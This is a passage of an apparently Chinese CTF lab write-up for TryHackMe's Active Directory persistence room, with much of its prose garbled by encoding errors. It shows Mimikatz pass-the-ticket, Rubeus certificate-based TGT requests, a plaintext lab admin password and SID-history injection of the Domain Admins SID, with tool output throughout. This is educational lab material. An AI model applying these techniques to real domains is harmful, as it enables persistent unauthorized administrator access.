ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5 i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+ f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY 5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3 NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ= ServiceName : krbtgt/za.tryhackme.loc ServiceRealm : za.tryhackme.loc UserName : Administrator UserRealm : za.tryhackme.loc StartTime : 2/6/2022 5:54:46 PM EndTime : 2/7/2022 3:54:46 AM RenewTill : 2/13/2022 5:54:46 PM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : aes256_cts_hmac_sha1 Base64(key) : Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU= ASREP (key) : BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Mimikatz åŠ è½½ TGT å¹¶å‘ THMDC è¿›è¡Œèº«ä»½éªŒè¯ï¼š C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # kerberos::ptt administrator.kirbi dir \\\\THMDC.za.tryhackme.loc\\c$\\ mimikatz # kerberos::ptt administrator.kirbi * File: 'administrator.kirbi': OK mimikatz # exit Bye! za\\aaron.jones@THMWRK1 C:\\Users\\aaron.jones&gt;dir \\\\THMDC.za.tryhackme.loc\\c$\\ Volume in drive \\\\THMDC.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\THMDC.za.tryhackme.loc\\c$ 01/04/2022 08:47 AM 103 delete-vagrant-user.ps1 04/30/2022 10:24 AM 154 dns_entries.csv 04/27/2022 10:53 PM 885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin 09/15/2018 08:19 AM &lt;DIR&gt; PerfLogs 03/21/2020 09:31 PM &lt;DIR&gt; Program Files 03/21/2020 09:28 PM &lt;DIR&gt; Program Files (x86) 04/27/2022 08:27 AM 1,423 thm-network-setup-dc.ps1 04/25/2022 07:13 PM &lt;DIR&gt; tmp 04/27/2022 08:22 AM &lt;DIR&gt; Users 04/25/2022 07:11 PM &lt;SYMLINKD&gt; vagrant [\\\\vboxsvr\\vagrant] 04/27/2022 08:12 PM &lt;DIR&gt; Windows 7 File(s) 2,356,811 bytes 7 Dir(s) 50,914,541,568 bytes free æˆ‘ä»¬ä¸å†æ˜¯è“é˜Ÿçš„æœ‹å‹ è¯ä¹¦æŒä¹…æ€§çš„é˜²å¾¡éš¾åº¦è¦å¤§å¾—å¤šã€‚å³ä½¿æ‚¨è½®æ¢å—æ„ŸæŸ“å¸æˆ·çš„å‡­æ®ï¼Œè¯ä¹¦ä»ç„¶æœ‰æ•ˆã€‚æ¶ˆé™¤æŒä¹…æ€§çš„å”¯ä¸€æ–¹æ³•æ˜¯åŠé”€è¯ä¹¦ã€‚ä½†æ˜¯ï¼Œåªæœ‰å½“æˆ‘ä»¬é€šè¿‡åˆæ³•æ¸ é“ç”Ÿæˆè¯ä¹¦æ—¶ï¼Œè¿™æ‰å¯èƒ½å®ç°ã€‚ç”±äºæˆ‘ä»¬å¯¼å‡ºäº† CA å¹¶è‡ªå·±ç”Ÿæˆäº†è¯ä¹¦ï¼Œå› æ­¤å®ƒä¸ä¼šå‡ºç°åœ¨ AD CS çš„å·²é¢å‘è¯ä¹¦åˆ—è¡¨ä¸­ï¼Œè¿™æ„å‘³ç€è“é˜Ÿå°†æ— æ³•æ’¤é”€æˆ‘ä»¬çš„è¯ä¹¦ã€‚ é‚£ä¹ˆæ¶ˆé™¤æŒä¹…æ€§çš„å”¯ä¸€è§£å†³æ–¹æ¡ˆæ˜¯ä»€ä¹ˆï¼Ÿå¥½å§ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸å†æ˜¯æœ‹å‹äº†ã€‚ä»–ä»¬å¿…é¡»åŠé”€æ ¹ CA è¯ä¹¦ã€‚ä½†æ˜¯åŠé”€è¿™ä¸ªè¯ä¹¦æ„å‘³ç€AD CSé¢å‘çš„æ‰€æœ‰è¯ä¹¦éƒ½ä¼šçªç„¶å¤±æ•ˆã€‚è¿™æ„å‘³ç€ä»–ä»¬å¿…é¡»ä¸ºæ¯ä¸ªä½¿ç”¨ AD CS çš„ç³»ç»Ÿç”Ÿæˆæ–°è¯ä¹¦ã€‚æ‚¨åº”è¯¥å¼€å§‹æ˜ç™½ä¸ºä»€ä¹ˆè¿™ç§ç±»å‹çš„æŒä¹…æ€§éå¸¸å±é™©ï¼Œå¹¶ä¸”å¦‚æœæ‰§è¡Œåˆ™éœ€è¦å®Œå…¨é‡å»ºç³»ç»Ÿã€‚ è¿™é‡Œåˆæ‰¾äº†å‡ ç¯‡æ–‡ç« æ‰¾åˆ°äº†è§£å†³åŠæ³•ï¼Œå°±æ˜¯rdpè¿æ¥ç›®æ ‡æœåŠ¡å™¨æ›´æ”¹ä¸€ä¸‹é…ç½® xfreerdp /d:za.tryhackme.loc /u:'Administrator' /p:'tryhackmewouldnotguess1@' /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard #ä½¿ç”¨runå¼¹çª—ï¼Œæ‰§è¡Œgpedit.msc(æˆ–è€…åœ¨winæœç´¢æ ä¸­æœç´¢gpedit) #ç¼–è¾‘ç»„ç­–ç•¥-&gt;è®¡ç®—æœºé…ç½®-&gt;windowsè®¾ç½®-&gt;å®‰å…¨è®¾ç½®-&gt;æœ¬åœ°ç­–ç•¥-&gt;å®‰å…¨é€‰é¡¹-&gt;é…ç½®Kerberoså…è®¸çš„åŠ å¯†ç±»å‹(å³é”®ç¼–è¾‘å±æ€§ï¼Œå‹¾é€‰éœ€è¦çš„åŠ å¯†ç±»å‹é€‰é¡¹å¹¶ç¡®å®šå³å¯) #ç¼–è¾‘ç»„ç­–ç•¥-&gt;è®¡ç®—æœºé…ç½®-&gt;ç®¡ç†æ¨¡ç‰ˆ-&gt;ç³»ç»Ÿ-&gt;KDC-&gt;å°†KDC support for PKInit Freshness Extensionè®¾å®šä¸ºEnable #é€šè¿‡RDPç•Œé¢é‡å¯DCå¹¶é€€å‡ºrdpç•Œé¢ï¼Œç„¶åç»§ç»­åœ¨æˆ‘ä»¬ä½¿ç”¨ä½æƒé™ADç”¨æˆ·æ‰€è®¿é—®çš„THMWRK1è·³æ¿ä¸»æœºä¸Šè¿›è¡Œæ“ä½œã€‚ za\\pauline.hargreaves@THMWRK1 C:\\Users\\pauline.hargreaves&gt;C:\\Tools\\Rubeus.exe asktgt /u ser:Administrator /enctype:aes256 /certificate:hybcx.pfx /password:Password123 /outfile :fullAdmin.kirbi /domain:za.tryhackme.loc /dc:10.200.62.101 ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.0 [*] Action: Ask TGT [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=User [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\\Administrator' [+] TGT request successful! [*] base64(ticket.kirbi): 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 [*] Ticket written to fullAdmin.kirbi ServiceName : krbtgt/za.tryhackme.loc ServiceRealm : ZA.TRYHACKME.LOC UserName : Administrator UserRealm : ZA.TRYHACKME.LOC StartTime : 2/29/2024 11:39:20 AM EndTime : 2/29/2024 9:39:20 PM RenewTill : 3/7/2024 11:39:20 AM Flags : name_canonicalize, pre_authent, initial, renewable, forwa rdable KeyType : aes256_cts_hmac_sha1 Base64(key) : d7iXvd7xTz/ZXRGvP+Iof3piKRTjXgaamnmziQZXYVo= ASREP (key) : B99608280DACD112BC2886CA0DFAF854C1DD09EDA0D5143A94ABE96E9 01580EE ä¹‹åå†æ¬¡å°è¯•ç»ˆäºæˆåŠŸ za\\pauline.hargreaves@THMWRK1 C:\\Users\\pauline.hargreaves&gt;dir \\\\THMDC.za.tryhackme.loc\\ c$\\ Volume in drive \\\\THMDC.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\THMDC.za.tryhackme.loc\\c$ 01/04/2022 07:47 AM 103 delete-vagrant-user.ps1 05/01/2022 08:11 AM 169 dns_entries.csv 09/15/2018 07:19 AM PerfLogs 05/11/2022 09:32 AM Program Files 03/21/2020 08:28 PM Program Files (x86) 07/03/2022 05:05 PM 7,168 shell.exe 05/01/2022 08:17 AM 1,725 thm-network-setup-dc.ps1 07/06/2022 03:38 PM tmp 06/30/2022 01:58 PM Tools 02/29/2024 11:15 AM Users 04/25/2022 06:11 PM vagrant [\\\\vboxsvr\\vagrant] 07/03/2022 08:51 AM Windows 4 File(s) 9,165 bytes 8 Dir(s) 51,454,889,984 bytes free 0x05 é€šè¿‡ SID å†å²è®°å½•è¿›è¡ŒæŒä¹…åŒ– å®‰å…¨æ ‡è¯†ç¬¦ (SID) ä¹‹å‰å·²è®¨è®ºè¿‡ã€‚ä½†å›é¡¾ä¸€ä¸‹ï¼ŒSID ç”¨äºåœ¨è¿æ¥åˆ°èµ„æºæ—¶è·Ÿè¸ªå®‰å…¨ä¸»ä½“å’Œå¸æˆ·çš„è®¿é—®æƒé™ã€‚ç„¶è€Œï¼Œå¸æˆ·æœ‰ä¸€ä¸ªæœ‰è¶£çš„å±æ€§ï¼Œç§°ä¸º SID å†å²è®°å½•ã€‚ SID å†å²è®°å½•çš„åˆæ³•ç”¨ä¾‹æ˜¯ä½¿ä¸€ä¸ªå¸æˆ·çš„è®¿é—®æƒé™èƒ½å¤Ÿæœ‰æ•ˆåœ°å…‹éš†åˆ°å¦ä¸€ä¸ªå¸æˆ·ã€‚å½“ç»„ç»‡å¿™äºæ‰§è¡Œ AD è¿ç§»æ—¶ï¼Œè¿™ä¸€ç‚¹éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå…è®¸ç”¨æˆ·åœ¨è¿ç§»åˆ°æ–°åŸŸæ—¶ä¿ç•™å¯¹åŸå§‹åŸŸçš„è®¿é—®æƒé™ã€‚åœ¨æ–°åŸŸä¸­ï¼Œç”¨æˆ·å°†æ‹¥æœ‰æ–°çš„ SIDï¼Œä½†æˆ‘ä»¬å¯ä»¥å°†ç”¨æˆ·ç°æœ‰çš„ SID æ·»åŠ åˆ° SID å†å²è®°å½•ä¸­ï¼Œè¿™ä»ç„¶å…è®¸ä»–ä»¬ä½¿ç”¨æ–°å¸æˆ·è®¿é—®å…ˆå‰åŸŸä¸­çš„èµ„æºã€‚è™½ç„¶ SID å†å²è®°å½•æœ‰åˆ©äºè¿ç§»ï¼Œä½†æˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…ä¹Ÿå¯ä»¥æ»¥ç”¨æ­¤åŠŸèƒ½æ¥å®ç°æŒä¹…æ€§ã€‚ å†å²å¯ä»¥æ˜¯æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•æ ·å­ é—®é¢˜æ˜¯ï¼ŒSID å†å²è®°å½•å¹¶ä¸ä»…é™äºåŒ…å«æ¥è‡ªå…¶ä»–åŸŸçš„ SIDã€‚æœ‰äº†æ­£ç¡®çš„æƒé™ï¼Œæˆ‘ä»¬åªéœ€å°†å½“å‰åŸŸçš„ SID æ·»åŠ åˆ°æˆ‘ä»¬æ§åˆ¶çš„å¸æˆ·çš„ SID å†å²è®°å½•ä¸­å³å¯ã€‚å…³äºè¿™ç§æŒä¹…æ€§æŠ€æœ¯çš„ä¸€äº›æœ‰è¶£çš„æ³¨é‡Šï¼š æˆ‘ä»¬é€šå¸¸éœ€è¦åŸŸç®¡ç†å‘˜æƒé™æˆ–åŒç­‰æƒé™æ‰èƒ½æ‰§è¡Œæ­¤æ”»å‡»ã€‚ å½“å¸æˆ·åˆ›å»ºç™»å½•äº‹ä»¶æ—¶ï¼Œä¸è¯¥å¸æˆ·å…³è”çš„ SID å°†æ·»åŠ åˆ°ç”¨æˆ·çš„ä»¤ç‰Œä¸­ï¼Œç„¶åç”±è¯¥ä»¤ç‰Œç¡®å®šä¸è¯¥å¸æˆ·å…³è”çš„æƒé™ã€‚è¿™åŒ…æ‹¬ç»„ SIDã€‚ å¦‚æœæˆ‘ä»¬æ³¨å…¥ä¼ä¸šç®¡ç†å‘˜ SIDï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥é‡‡å–è¿™ç§æ”»å‡»ï¼Œå› ä¸ºè¿™ä¼šæå‡å¸æˆ·çš„æƒé™ï¼Œä½¿å…¶æˆä¸ºæ—ä¸­æ‰€æœ‰åŸŸä¸­çš„åŸŸç®¡ç†å‘˜ã€‚ ç”±äº SID å·²æ·»åŠ åˆ°ç”¨æˆ·çš„ä»¤ç‰Œä¸­ï¼Œå› æ­¤å³ä½¿è¯¥å¸æˆ·ä¸æ˜¯å®é™…ç»„çš„æˆå‘˜ï¼Œä¹Ÿä¼šå°Šé‡æƒé™ã€‚è¿™ä½¿å¾—è¿™æ˜¯ä¸€ç§éå¸¸ç‹¡çŒ¾çš„æŒä¹…æ–¹æ³•ã€‚æˆ‘ä»¬æ‹¥æœ‰å±å®³æ•´ä¸ªåŸŸï¼ˆä¹Ÿè®¸æ˜¯æ•´ä¸ªæ—ï¼‰æ‰€éœ€çš„æ‰€æœ‰æƒé™ï¼Œä½†æˆ‘ä»¬çš„å¸æˆ·å¯ä»¥åªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·å¸æˆ·ï¼Œä»…å…·æœ‰åŸŸç”¨æˆ·ç»„çš„æˆå‘˜èº«ä»½ã€‚é€šè¿‡å§‹ç»ˆä½¿ç”¨æ­¤å¸æˆ·æ¥æ›´æ”¹å¦ä¸€ä¸ªå¸æˆ·çš„ SID å†å²è®°å½•ï¼Œæˆ‘ä»¬å¯ä»¥å°†å·å·æ‘¸æ‘¸çš„è¡Œä¸ºæå‡åˆ°å¦ä¸€ä¸ªçº§åˆ«ï¼Œå› æ­¤åˆå§‹æŒä¹…æ€§å‘é‡ä¸é‚£ä¹ˆå®¹æ˜“è¢«å‘ç°å’Œè¡¥æ•‘ã€‚ é”»é€ å†å² åœ¨ä¸‹ä¸€æ­¥ä¸­ï¼Œä½¿ç”¨ç®¡ç†å‘˜å‡­æ®åœ¨THMDCä¸Šè·å–ä¸€ä¸ªSSHä¼šè¯ã€‚åœ¨ä¼ªé€ SIDå†å²ä¹‹å‰ï¼Œè®©æˆ‘ä»¬é¦–å…ˆè·å–ä¸€äº›å…³äºSIDçš„ä¿¡æ¯ã€‚é¦–å…ˆï¼Œç¡®ä¿æˆ‘ä»¬çš„ä½æƒé™ç”¨æˆ·å½“å‰æ²¡æœ‰ä»»ä½•SIDå†å²ä¿¡æ¯ï¼š Your credentials have been generated: Username: louis.cole Password: Password! za\\administrator@THMDC C:\\Users\\Administrator&gt;powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator&gt; Get-ADUser louis.cole -Properties sidhistory,memberof DistinguishedName : CN=pauline.hargreaves,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc Enabled : True GivenName : Pauline MemberOf : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc} Name : pauline.hargreaves ObjectClass : user ObjectGUID : daa57f4b-cdf8-48a0-8e92-8e03c7b88c54 SamAccountName : pauline.hargreaves SID : S-1-5-21-3885271727-2693558621-2658995185-1121 SIDHistory : {} Surname : Hargreaves UserPrincipalName : å¯ä»¥çœ‹åˆ°è¿™é‡Œsidå†å²ä¸ºç©ºï¼šè¿™è¯å®æˆ‘ä»¬çš„ç”¨æˆ·å½“å‰æ²¡æœ‰è®¾ç½®ä»»ä½• SID å†å²è®°å½•ã€‚è®©æˆ‘ä»¬è·å– Domain Admins ç»„çš„ SIDï¼Œå› ä¸ºè¿™æ˜¯æˆ‘ä»¬è¦æ·»åŠ åˆ° SID å†å²è®°å½•ä¸­çš„ç»„ï¼š æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Mimikatz ä¹‹ç±»çš„ä¸œè¥¿æ¥æ·»åŠ  SID å†å²è®°å½•ã€‚ç„¶è€Œï¼Œæœ€æ–°ç‰ˆæœ¬çš„ Mimikatz æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œä¸å…è®¸å®ƒä¿®è¡¥ LSASS æ¥æ›´æ–° SID å†å²è®°å½•ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶ä»–ä¸œè¥¿ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ DSInternals å·¥å…·ç›´æ¥ä¿®è¡¥ ntds.dit æ–‡ä»¶ï¼Œå³å­˜å‚¨æ‰€æœ‰ä¿¡æ¯çš„ AD æ•°æ®åº“ï¼š Install-Module DSInternals -Force Import-Moduls DSInternals //è¿™é‡Œåœ¨ä¸‹è½½çš„æ—¶å€™ä¸€ç›´æŠ¥é”™ï¼Œä¸çŸ¥ä¸ºä½•ï¼Œå°è¯•äº†åŠå¤©æ— æœï¼Œå‘ç°ç›®æ ‡æœºå·²ç»æœ‰æ”¹å·¥å…·äº†ã€‚ã€‚ã€‚ Stop-Service -Name ntds -force Add-ADDBSidHistory -SamAccountName 'louis.cole' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\\Windows\\NTDS tds.dit Start-Service -Name ntds NTDS æœåŠ¡è¿è¡Œæ—¶ï¼ŒNTDS æ•°æ®åº“è¢«é”å®šã€‚ä¸ºäº†ä¿®è¡¥æˆ‘ä»¬çš„ SID å†å²è®°å½•ï¼Œæˆ‘ä»¬å¿…é¡»é¦–å…ˆåœæ­¢è¯¥æœåŠ¡ã€‚è¡¥ä¸å®Œæˆåå¿…é¡»é‡æ–°å¯åŠ¨NTDSæœåŠ¡ï¼Œå¦åˆ™æ•´ä¸ªç½‘ç»œçš„è®¤è¯å°†æ— æ³•è¿›è¡Œã€‚ æ‰§è¡Œè¿™äº›æ­¥éª¤åï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ä½æƒé™å‡­æ®é€šè¿‡ SSH ç™»å½•åˆ° THMWRK1ï¼Œå¹¶éªŒè¯æ˜¯å¦å·²æ·»åŠ  SID å†å²è®°å½•ä»¥åŠæˆ‘ä»¬ç°åœ¨æ˜¯å¦å…·æœ‰åŸŸç®¡ç†å‘˜æƒé™ï¼š za\\louis.cole@THMWRK1 C:\\Users\\louis.cole&gt;powershell -ep bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\louis.cole&gt; Get-ADUser louis.cole -Properties sidhistory DistinguishedName : CN=louis.cole,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc Enabled : True GivenName : Louis Name : louis.cole ObjectClass : user ObjectGUID : bf78bdb9-3289-461d-8193-d7fd88d3b23b SamAccountName : louis.cole SID : S-1-5-21-3885271727-2693558621-2658995185-1120 SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512} Surname : Cole UserPrincipalName : PS C:\\Users\\louis.cole&gt; dir \\\\thmdc.za.tryhackme.loc\\c$ Directory: \\\\thmdc.za.tryhackme.loc\\c$ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/15/2018 8:19 AM PerfLogs d-r--- 5/11/2022 10:32 AM Program Files d----- 3/21/2020 8:28 PM Program Files (x86) d----- 7/6/2022 4:38 PM tmp da---- 6/30/2022 2:58 PM Tools d-r--- 2/28/2024 10:29 PM Users d----l 4/25/2022 7:11 PM vagrant d----- 7/3/2022 9:51 AM Windows -a---- 1/4/2022 7:47 AM 103 delete-vagrant-user.ps1 -a---- 5/1/2022 9:11 AM 169 dns_entries.csv -a---- 7/3/2022 6:05 PM 7168 shell.exe -a---- 5/1/2022 9:17 AM 1725 thm-network-setup-dc.ps1 æ ¹æ®ä¸Šé¢çš„è¾“å‡ºï¼Œæ•ˆæœå¾ˆå¥½ï¼æˆ‘ä»¬èƒ½å¤Ÿä¼ªé€ æˆ‘ä»¬çš„ SID å†å²è®°å½•ï¼Œæˆäºˆæˆ‘ä»¬çš„ä½ç‰¹æƒå¸æˆ· DA è®¿é—®æƒé™ï¼ è“é˜Ÿçš„å¹²è‰å‰å’Œç«æŠŠ å¦‚æœè“é˜Ÿé€šè¿‡RDPè®¿é—®åŸŸå†…ä¸»æœºå¹¶ä½¿ç”¨ADç”¨æˆ·å’Œç»„ç®¡ç†å•å…ƒï¼Œé‚£ä¹ˆè“é˜Ÿå°†èƒ½å¤ŸæŸ¥çœ‹æ·»åŠ åˆ°å½“å‰ADç”¨æˆ·çš„SIDå†å²è®°å½•å±æ€§ï¼›ä½†æ˜¯ï¼Œå³ä½¿è“é˜Ÿå…·æœ‰æœ€é«˜æƒé™ï¼Œä¹Ÿæ— æ³•é€šè¿‡GUIç•Œé¢ç›´æ¥åˆ é™¤ADç”¨æˆ·çš„SIDå†å²è®°å½•å±æ€§ï¼Œå› ä¸ºå®ƒæ˜¯å—ä¿æŠ¤çš„ã€‚ ä¸ºäº†æˆåŠŸåˆ é™¤æ”»å‡»è€…æ‰€æ·»åŠ çš„SIDå†å²è®°å½•ï¼Œè“é˜Ÿå¿…é¡»ä½¿ç”¨è¯¸å¦‚AD-RSAT PowerShell cmletä¹‹ç±»çš„å·¥å…·ï¼›æ­¤å¤–ï¼Œè“é˜Ÿè¿˜å¿…é¡»å…ˆæ‰¾åˆ°æ”»å‡»è€…æ‰€ä¿®æ”¹çš„SIDå†å²è®°å½•ï¼Œè¿™éœ€è¦è“é˜Ÿæˆå‘˜ä¸»åŠ¨è¿‡æ»¤å¹¶æŸ¥çœ‹ç”¨æˆ·çš„ç›¸å…³å±æ€§ï¼Œå¦åˆ™å¾ˆéš¾æ‰¾åˆ°æ¶æ„çš„SID å†å²è®°å½•ï¼Œå› ä¸ºåªæœ‰åœ¨ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯æ—¶æ‰ä¼šåº”ç”¨å’Œä½¿ç”¨è¿™äº›SIDå†å²è®°å½•ã€‚ æƒ³è±¡ä¸€ä¸‹ï¼Œæ‚¨æ˜¯è“é˜Ÿï¼Œæ­£åœ¨å¤„ç†åˆšåˆšæ‰§è¡ŒåŸŸåå›æ”¶çš„äº‹ä»¶ã€‚æ‚¨å°† krbtgt å¸æˆ·çš„å¯†ç è½®æ¢äº†ä¸¤æ¬¡ï¼Œåˆ é™¤äº†é‡‘ç¥¨å’Œé“¶ç¥¨ï¼Œå¹¶ä»å¤´å¼€å§‹é‡å»ºäº†æ•´ä¸ª CA æœåŠ¡å™¨ï¼Œåªæ˜¯ä¸ºäº†çœ‹åˆ°æ”»å‡»è€…ä»åœ¨ä½¿ç”¨ä½æƒé™å¸æˆ·æ‰§è¡Œ DA å‘½ä»¤ã€‚è¿™ä¸ä¼šæ˜¯ç¾å¥½çš„ä¸€å¤©ã€‚ 0x06 é€šè¿‡ç»„æˆå‘˜èº«ä»½å®ç°æŒä¹…æ€§ å¦‚æœæˆ‘ä»¬ä¸æƒ³ç¯¡æ”¹SIDå†å²è®°å½•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†è‡ªå·±æ·»åŠ 